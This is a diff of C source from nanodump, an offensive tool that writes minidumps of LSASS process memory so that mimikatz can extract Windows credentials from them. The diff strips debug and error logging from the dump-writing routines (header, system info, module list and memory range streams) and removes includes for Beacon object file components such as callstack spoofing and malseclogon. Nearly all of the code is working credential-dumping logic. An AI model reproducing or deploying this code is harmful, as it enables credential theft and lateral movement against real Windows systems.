@@ -1,19 +1,5 @@
 #include "nanodump.h"
 #include "beacon.h"
-#ifdef BOF
-#include "output.h"
-#include "utils.c"
-#include "handle.c"
-#include "modules.c"
-#include "syscalls.c"
-#include "token_priv.c"
-#include "malseclogon.c"
-#include "werfault.c"
-#include "spoof_callstack.c"
-#include "shtinkering.c"
-#include "impersonate.c"
-#include "hw_breakpoint.c"
-#endif
 
 VOID writeat(
     IN Pdump_context dc,
@@ -36,12 +22,10 @@ BOOL append(
     ULONG32 new_rva = dc->rva + size;
     if (new_rva < dc->rva)
     {
-        PRINT_ERR("The dump size exceeds the 32-bit address space!");
         return FALSE;
     }
     else if (new_rva >= dc->DumpMaxSize)
     {
-        PRINT_ERR("The dump is too big, please increase DUMP_MAX_SIZE.");
         return FALSE;
     }
     else
@@ -55,13 +39,13 @@ BOOL append(
 BOOL write_header(
     IN Pdump_context dc)
 {
-    DPRINT("Writing header");
+    
     MiniDumpHeader header = { 0 };
-    DPRINT("Signature: 0x%x", dc->Signature);
+    
     header.Signature = dc->Signature;
-    DPRINT("Version: %hu", dc->Version);
+    
     header.Version = dc->Version;
-    DPRINT("ImplementationVersion: %hu", dc->ImplementationVersion);
+    
     header.ImplementationVersion = dc->ImplementationVersion;
     header.NumberOfStreams = 3; // we only need: SystemInfoStream, ModuleListStream and Memory64ListStream
     header.StreamDirectoryRva = SIZE_OF_HEADER;
@@ -85,7 +69,7 @@ BOOL write_header(
 
     if (!append(dc, header_bytes, SIZE_OF_HEADER))
     {
-        DPRINT_ERR("Failed to write header");
+        
         return FALSE;
     }
 
@@ -110,36 +94,36 @@ BOOL write_directory(
 BOOL write_directories(
     IN Pdump_context dc)
 {
-    DPRINT("Writing directory: SystemInfoStream");
+    
     MiniDumpDirectory system_info_directory = { 0 };
     system_info_directory.StreamType = SystemInfoStream;
     system_info_directory.DataSize = 0; // this is calculated and written later
     system_info_directory.Rva = 0; // this is calculated and written later
     if (!write_directory(dc, system_info_directory))
     {
-        DPRINT_ERR("Failed to write directory");
+        
         return FALSE;
     }
 
-    DPRINT("Writing directory: ModuleListStream");
+    
     MiniDumpDirectory module_list_directory = { 0 };
     module_list_directory.StreamType = ModuleListStream;
     module_list_directory.DataSize = 0; // this is calculated and written later
     module_list_directory.Rva = 0; // this is calculated and written later
     if (!write_directory(dc, module_list_directory))
     {
-        DPRINT_ERR("Failed to write directory");
+        
         return FALSE;
     }
 
-    DPRINT("Writing directory: Memory64ListStream");
+    
     MiniDumpDirectory memory64_list_directory = { 0 };
     memory64_list_directory.StreamType = Memory64ListStream;
     memory64_list_directory.DataSize = 0; // this is calculated and written later
     memory64_list_directory.Rva = 0; // this is calculated and written later
     if (!write_directory(dc, memory64_list_directory))
     {
-        DPRINT_ERR("Failed to write directory");
+        
         return FALSE;
     }
 
@@ -151,7 +135,7 @@ BOOL write_system_info_stream(
 {
     MiniDumpSystemInfo system_info = { 0 };
 
-    DPRINT("Writing SystemInfoStream");
+    
 
     // read the version and build numbers from the PEB
     PVOID pPeb;
@@ -167,10 +151,10 @@ BOOL write_system_info_stream(
     OSPlatformId = RVA(PULONG32, pPeb, OSPLATFORMID_OFFSET);
     CSDVersion = RVA(PUNICODE_STRING, pPeb, CSDVERSION_OFFSET);
     system_info.ProcessorArchitecture = PROCESSOR_ARCHITECTURE;
-    DPRINT("OSMajorVersion: %d", *OSMajorVersion);
-    DPRINT("OSMinorVersion: %d", *OSMinorVersion);
-    DPRINT("OSBuildNumber: %d", *OSBuildNumber);
-    DPRINT("CSDVersion: %ls", CSDVersion->Buffer);
+    
+    
+    
+    
 
     system_info.ProcessorLevel = 0;
     system_info.ProcessorRevision = 0;
@@ -229,7 +213,7 @@ BOOL write_system_info_stream(
     ULONG32 stream_rva = dc->rva;
     if (!append(dc, system_info_bytes, stream_size))
     {
-        DPRINT_ERR("Failed to write the SystemInfoStream");
+        
         return FALSE;
     }
 
@@ -245,13 +229,13 @@ BOOL write_system_info_stream(
     // write the length
     if (!append(dc, &Length, 4))
     {
-        DPRINT_ERR("Failed to write the SystemInfoStream");
+        
         return FALSE;
     }
     // write the service pack name
     if (!append(dc, CSDVersion->Buffer, CSDVersion->Length))
     {
-        DPRINT_ERR("Failed to write the SystemInfoStream");
+        
         return FALSE;
     }
     // write the service pack RVA in the SystemInfoStream
@@ -263,7 +247,7 @@ BOOL write_system_info_stream(
 Pmodule_info write_module_list_stream(
     IN Pdump_context dc)
 {
-    DPRINT("Writing the ModuleListStream");
+    
 
     // list of modules relevant to mimikatz
     wchar_t* important_modules[] = {
@@ -279,7 +263,7 @@ Pmodule_info write_module_list_stream(
         TRUE);
     if (!module_list)
     {
-        DPRINT_ERR("Failed to write the ModuleListStream");
+        
         return NULL;
     }
 
@@ -296,14 +280,14 @@ Pmodule_info write_module_list_stream(
         // write the length of the name
         if (!append(dc, &full_name_length, 4))
         {
-            DPRINT_ERR("Failed to write the ModuleListStream");
+            
             free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
             return NULL;
         }
         // write the path
         if (!append(dc, curr_module->dll_name, full_name_length))
         {
-            DPRINT_ERR("Failed to write the ModuleListStream");
+            
             free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
             return NULL;
         }
@@ -314,7 +298,7 @@ Pmodule_info write_module_list_stream(
     // write the number of modules
     if (!append(dc, &number_of_modules, 4))
     {
-        DPRINT_ERR("Failed to write the ModuleListStream");
+        
         free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
         return NULL;
     }
@@ -376,7 +360,7 @@ Pmodule_info write_module_list_stream(
 
         if (!append(dc, module_bytes, sizeof(module_bytes)))
         {
-            DPRINT_ERR("Failed to write the ModuleListStream");
+            
             free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
             return NULL;
         }
@@ -422,7 +406,7 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
     DWORD number_of_ranges = 0;
     NTSTATUS status;
 
-    DPRINT("Getting memory ranges to dump");
+    
 
     while (TRUE)
     {
@@ -467,7 +451,6 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
                 module_list))
             continue;
 #ifdef SSP
-        // if nanodump is running in LSASS, don't dump the dump :)
         if (dc->BaseAddress == base_address)
             continue;
 #endif
@@ -476,7 +459,7 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
         if(!new_range)
         {
             malloc_failed();
-            DPRINT_ERR("Failed to get memory ranges to dump");
+            
             return NULL;
         }
         new_range->next = NULL;
@@ -502,12 +485,10 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
     if (!ranges_list)
     {
         syscall_failed("NtQueryVirtualMemory", status);
-        DPRINT_ERR("Failed to enumerate memory ranges");
+        
         return NULL;
     }
-    DPRINT(
-        "Enumearted %ld ranges of memory",
-        number_of_ranges);
+
     return ranges_list;
 }
 
@@ -518,14 +499,14 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     PMiniDumpMemoryDescriptor64 memory_ranges;
     ULONG32 stream_rva = dc->rva;
 
-    DPRINT("Writing the Memory64ListStream");
+    
 
     memory_ranges = get_memory_ranges(
         dc,
         module_list);
     if (!memory_ranges)
     {
-        DPRINT_ERR("Failed to write the Memory64ListStream");
+        
         return NULL;
     }
 
@@ -539,14 +520,14 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     }
     if (!append(dc, &number_of_ranges, 8))
     {
-        DPRINT_ERR("Failed to write the Memory64ListStream");
+        
         free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
         return NULL;
     }
     // make sure we don't overflow stream_size
     if (16 + 16 * number_of_ranges > 0xffffffff)
     {
-        DPRINT_ERR("Too many ranges!");
+        
         free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
         return NULL;
     }
@@ -556,7 +537,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     ULONG64 base_rva = (ULONG64)stream_rva + stream_size;
     if (!append(dc, &base_rva, 8))
     {
-        DPRINT_ERR("Failed to write the Memory64ListStream");
+        
         free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
         return NULL;
     }
@@ -567,13 +548,13 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     {
         if (!append(dc, &curr_range->StartOfMemoryRange, 8))
         {
-            DPRINT_ERR("Failed to write the Memory64ListStream");
+            
             free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
             return NULL;
         }
         if (!append(dc, &curr_range->DataSize, 8))
         {
-            DPRINT_ERR("Failed to write the Memory64ListStream");
+            
             free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
             return NULL;
         }
@@ -594,7 +575,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
         PBYTE buffer = intAlloc(curr_range->DataSize);
         if (!buffer)
         {
-            DPRINT_ERR("Failed to write the Memory64ListStream");
+            
             malloc_failed();
             return NULL;
         }
@@ -607,24 +588,16 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
         // once in a while, a range fails with STATUS_PARTIAL_COPY, not relevant for mimikatz
         if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY)
         {
-            DPRINT_ERR(
-                "Failed to read memory range: StartOfMemoryRange: 0x%p, DataSize: 0x%64llx, State: 0x%lx, Protect: 0x%lx, Type: 0x%lx, NtReadVirtualMemory status: 0x%lx. Continuing anyways...",
-                (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
-                curr_range->DataSize,
-                curr_range->State,
-                curr_range->Protect,
-                curr_range->Type,
-                status);
             //return NULL;
         }
         if (curr_range->DataSize > 0xffffffff)
         {
-            DPRINT_ERR("The current range is larger that the 32-bit address space!");
+            
             curr_range->DataSize = 0xffffffff;
         }
         if (!append(dc, buffer, (ULONG32)curr_range->DataSize))
         {
-            DPRINT_ERR("Failed to write the Memory64ListStream");
+            
             free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
             DATA_FREE(buffer, curr_range->DataSize);
             return NULL;
@@ -639,7 +612,6 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
 BOOL NanoDumpWriteDump(
     IN Pdump_context dc)
 {
-    DPRINT("Writing nanodump");
 
     if (!write_header(dc))
         return FALSE;
@@ -667,7 +639,7 @@ BOOL NanoDumpWriteDump(
 
     free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
 
-    DPRINT("The nanodump was created succesfully");
+    
 
     return TRUE;
 }
